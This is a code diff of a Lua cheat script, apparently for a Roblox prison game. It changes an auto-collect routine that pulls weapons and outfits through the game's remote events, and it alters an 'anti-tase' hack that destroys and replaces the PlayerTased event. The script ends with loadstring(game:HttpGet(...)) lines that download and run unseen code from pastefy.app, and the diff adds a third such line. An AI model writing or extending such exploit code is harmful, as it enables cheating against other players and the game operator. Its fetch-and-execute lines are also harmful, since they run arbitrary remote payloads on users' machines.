@@ -28,7 +28,6 @@ local antiTaseDummyEvent = nil
 local antiTaseMovementConnection = nil
 local antiTaseEventConnection = nil
 local antiTaseIsMoving = false
-local originalPlayerTased = nil
 
 local WHITELIST = {
     [10832085518] = true,
@@ -114,32 +113,14 @@ local function AutoCollectLoop()
     AutoCollectItem("Remington 870", "giver")
     AutoCollectItem("MP5", "giver")
     AutoCollectItem("Mafia", "clothes")
+    AutoCollectItem("Riot Police", "clothes")
     AutoCollectItem("Light Vest", "clothes")
     AutoCollectItem("Revolver", "giver")
     AutoCollectItem("FAL", "giver")
     AutoCollectItem("C4 Explosive", "giver")
     AutoCollectItem("M700", "giver")
-
-    pcall(function()
-        local args = {
-            workspace:WaitForChild("Prison_ITEMS"):WaitForChild("clothes"):WaitForChild("Riot Police"):WaitForChild("Torso")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("InteractWithItem"):InvokeServer(unpack(args))
-    end)
-
-    pcall(function()
-        local args = {
-            workspace:WaitForChild("Prison_ITEMS"):WaitForChild("giver"):WaitForChild("M4A1"):WaitForChild("Mesh")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("InteractWithItem"):InvokeServer(unpack(args))
-    end)
-
-    pcall(function()
-        local args = {
-            workspace:WaitForChild("Prison_ITEMS"):WaitForChild("giver"):WaitForChild("Riot Shield"):WaitForChild("ITEMPICKUP")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("InteractWithItem"):InvokeServer(unpack(args))
-    end)
+    AutoCollectItem("M4A1", "giver")
+    AutoCollectItem("Riot Shield", "giver")
 end
 
 local function GetHandcuffsTool()
@@ -725,12 +706,10 @@ local function EnableAntiTase()
     local PlayerTased = GunRemotes:FindFirstChild("PlayerTased")
     if not PlayerTased then return end
 
-    originalPlayerTased = PlayerTased
-    originalPlayerTased.Parent = nil
-
     antiTaseDummyEvent = Instance.new("RemoteEvent")
     antiTaseDummyEvent.Name = "PlayerTased"
     antiTaseDummyEvent.Parent = GunRemotes
+    PlayerTased:Destroy()
 
     antiTaseMovementConnection = RunService.Heartbeat:Connect(function()
         antiTaseIsMoving = Humanoid.MoveDirection.Magnitude > 0.01
@@ -753,15 +732,14 @@ local function DisableAntiTase()
         antiTaseEventConnection = nil
     end
     if antiTaseDummyEvent then
-        antiTaseDummyEvent:Destroy()
-        antiTaseDummyEvent = nil
-    end
-    if originalPlayerTased then
         local GunRemotes = ReplicatedStorage:FindFirstChild("GunRemotes")
         if GunRemotes then
-            originalPlayerTased.Parent = GunRemotes
+            local realEvent = Instance.new("RemoteEvent")
+            realEvent.Name = "PlayerTased"
+            realEvent.Parent = GunRemotes
         end
-        originalPlayerTased = nil
+        antiTaseDummyEvent:Destroy()
+        antiTaseDummyEvent = nil
     end
     antiTaseIsMoving = false
 end
@@ -905,3 +883,4 @@ end)
 
 loadstring(game:HttpGet("https://pastefy.app/kGuIOobm/raw"))()
 loadstring(game:HttpGet("https://pastefy.app/X6lMAjAy/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/9gvb9mgt/raw"))()
